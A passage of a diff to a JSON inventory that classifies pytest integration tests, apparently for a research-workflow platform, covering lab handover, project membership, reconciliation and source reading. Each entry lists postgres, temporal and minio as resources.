+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_a_document_the_package_does_not_hold_is_refused_with_what_it_does",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_a_member_of_another_project_cannot_read_or_upload",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_a_package_directory_that_is_gone_is_reported_as_gone",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_a_report_is_recorded_and_goes_to_the_run_as_a_question",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_a_report_nothing_is_waiting_for_is_recorded_and_says_so",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_an_upload_answering_an_owed_output_is_recorded_and_tells_the_run",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_an_upload_that_answers_nothing_is_refused_before_a_byte_is_stored",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_an_upload_the_run_could_not_be_told_about_is_still_recorded",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_an_upload_to_a_handover_that_has_ended_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_an_upload_with_no_handover_is_refused_with_why",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_every_owed_output_recorded_still_leaves_the_run_waiting",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_no_token_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_the_names_the_package_lists_are_plain_file_names",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_the_task_shows_the_package_the_bench_was_handed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_a_caller_opens_a_project_and_owns_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_a_foreign_project_and_a_missing_one_are_one_answer",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_a_lab_user_cannot_add_anybody",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_a_member_who_may_not_manage_members_cannot_read_them",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_a_non_member_cannot_be_withdrawn",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_a_user_who_already_holds_a_role_is_a_conflict",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_an_administrator_cannot_add_anybody",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_an_owner_adds_an_existing_account",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_an_owner_may_add_an_administrator",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_an_owner_reads_the_live_members",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_an_owner_withdraws_a_role_and_it_stops_working_at_once",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_every_membership_change_is_on_the_record",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_no_route_creates_an_account",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_opening_a_project_needs_an_account_and_a_body",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_members.py::test_the_last_owner_cannot_step_down",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
       "nodeid": "tests/integration/gateway/test_messages.py::test_a_conversation_turn_does_not_write_project_events",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -3356,7 +4619,7 @@
       ]
     },
     {
-      "nodeid": "tests/integration/gateway/test_projects.py::test_an_administrator_may_read_but_must_be_a_projects_first_member",
+      "nodeid": "tests/integration/gateway/test_projects.py::test_an_administrator_may_read_but_must_be_a_member",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -3379,6 +4642,17 @@
     },
     {
       "nodeid": "tests/integration/gateway/test_projects.py::test_every_read_of_a_foreign_project_is_refused_the_same_way",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_projects.py::test_every_role_may_read_the_project_they_are_in[ADMIN]",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -4016,6 +5290,523 @@
       ]
     },
     {
+      "nodeid": "tests/integration/master/test_research_readback.py::test_a_non_research_node_has_no_result_to_read",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/master/test_research_readback.py::test_master_reads_a_research_result_its_seat_submitted",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/master/test_research_readback.py::test_the_ledger_holds_what_the_readback_reports",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/master/test_research_readback.py::test_the_listing_names_which_tasks_have_something_to_read",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/master/test_research_readback.py::test_the_project_state_says_a_result_is_available",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/master/test_research_readback.py::test_the_readback_tools_are_masters_and_write_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_dead_run_stops_stranding_its_node",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_frontend_that_cannot_be_reached_is_not_evidence",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_lost_run_with_no_job_is_still_recovered",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_node_answered_meanwhile_is_left_alone",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_node_no_worker_runs_is_never_asked_about[DECISION]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_node_no_worker_runs_is_never_asked_about[HYPOTHESIS]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_node_no_worker_runs_is_never_asked_about[RESEARCH]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_node_that_has_left_the_live_statuses_is_not_asked_about",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_project_with_nothing_running_is_not_asked_about_at_all",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_reconciliation_belongs_to_its_project",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_run_that_finished_unconsumed_is_recovered_too",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_run_that_is_still_going_is_left_alone",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_run_that_started_moments_ago_is_not_questioned",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_run_that_was_stopped_is_a_cancellation_and_not_a_failure",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_second_loss_under_revised_terms_is_its_own_record",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_a_waiter_is_brought_back_before_master_is_asked",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_recovery_does_not_depend_on_which_worker_run_it_is[COMPUTATION]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_recovery_does_not_depend_on_which_worker_run_it_is[EXPERIMENT]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_scanning_twice_finds_the_loss_once",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_the_job_is_failed_for_infrastructure_and_not_for_science",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_the_node_is_not_told_the_science_failed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_the_reconciliation_is_append_only",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_the_workflow_it_asks_about_is_the_one_the_start_path_would_make",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/reconcile/test_execution_reconcile.py::test_two_sweeps_at_once_still_write_one_record",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_character_offset_is_refused_for_a_source_that_has_pages",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_metadata_refusal_is_not_a_stored_byte",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_pdf_is_read_by_page_and_its_text_is_the_body",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_pdf_refuses_a_character_region",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_read_is_a_bounded_region_and_says_where_the_next_one_is",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_read_never_returns_more_than_the_cap",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_registered_source_is_read_back_out_of_its_snapshot",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_scanned_pdf_says_it_has_no_text_instead_of_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_search_finds_the_offset_a_read_then_uses",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_search_that_finds_nothing_says_so_about_the_source",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_source_stored_without_a_snapshot_cannot_be_read",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_a_source_that_was_never_read_has_nothing_to_read",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_another_projects_source_is_not_readable_here",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_bytes_that_disagree_with_the_row_are_refused_rather_than_read",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_reading_tools_are_not_registered_for_any_other_role",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_reading_writes_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/research/test_deep_read.py::test_the_bytes_a_read_returns_are_the_bytes_the_row_describes",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
       "nodeid": "tests/integration/research/test_gateway_registration.py::test_a_gateway_cannot_write_into_another_project",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -4555,6 +6346,61 @@
       ]
     },
     {
+      "nodeid": "tests/integration/roles/test_master_terms.py::test_a_node_that_names_no_environment_requires_no_preparation",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/roles/test_master_terms.py::test_a_range_that_is_not_a_range_is_refused_and_plans_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/roles/test_master_terms.py::test_a_requirement_of_an_unknown_kind_is_refused_and_plans_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/roles/test_master_terms.py::test_a_stage_writes_the_terms_of_every_node_in_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/roles/test_master_terms.py::test_master_writes_every_term_the_contract_can_carry",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
       "nodeid": "tests/integration/roles/test_permissions.py::test_a_node_planned_through_the_tool_can_actually_run",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -4655,6 +6501,17 @@
     },
     {
       "nodeid": "tests/integration/roles/test_permissions.py::test_a_non_master_server_does_not_register_a_dag_mutation_tool[review]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/roles/test_permissions.py::test_a_review_node_is_refused_at_planning_and_the_plan_keeps_nothing",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -5281,6 +7138,17 @@
       ]
     },
     {
+      "nodeid": "tests/integration/roles/test_worker_tools.py::test_a_refusal_does_not_hide_the_workspace_the_run_was_built_in",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
       "nodeid": "tests/integration/roles/test_worker_tools.py::test_a_substitution_that_is_not_a_pair_is_not_asked_at_all",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -5381,6 +7249,17 @@
     },
     {
       "nodeid": "tests/integration/roles/test_worker_tools.py::test_the_status_says_what_has_happened_not_what_was_planned",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/roles/test_worker_tools.py::test_the_status_says_which_workspace_the_run_was_built_in",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -5963,7 +7842,73 @@
       ]
     },
     {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_lab_user_cannot_withdraw_a_membership",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_live_membership_is_refused_rather_than_edited",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
       "nodeid": "tests/integration/state/test_identity.py::test_a_member_without_the_required_authority_cannot_answer",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_membership_cannot_be_deleted",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_membership_that_is_not_there_cannot_be_withdrawn",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_project_keeps_its_last_owner",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_role_cannot_be_edited_in_place",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -5986,6 +7931,72 @@
     },
     {
       "nodeid": "tests/integration/state/test_identity.py::test_a_stranger_cannot_grant_authority",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_withdrawal_is_on_the_record",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_withdrawn_membership_is_history_and_not_a_deletion",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_withdrawn_membership_is_not_a_project_the_user_belongs_to",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_withdrawn_user_is_refused_on_the_next_request",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_a_withdrawn_user_may_be_granted_again",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_an_administrator_cannot_withdraw_a_membership",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -6030,6 +8041,17 @@
     },
     {
       "nodeid": "tests/integration/state/test_identity.py::test_an_approval_is_answered_against_the_project_that_asked",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_identity.py::test_an_owner_may_confer_the_operational_role",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -6172,7 +8194,7 @@
       ]
     },
     {
-      "nodeid": "tests/integration/state/test_outbox.py::test_a_project_creation_emits_exactly_one_event",
+      "nodeid": "tests/integration/state/test_outbox.py::test_a_project_creation_emits_the_facts_of_its_creation",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -6250,6 +8272,83 @@
     },
     {
       "nodeid": "tests/integration/state/test_outbox.py::test_sequences_are_independent_per_project",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_preparations.py::test_a_preparation_belongs_to_its_project",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_preparations.py::test_a_preparation_is_append_only",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_preparations.py::test_a_refusal_reads_back_with_the_class_that_routes_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
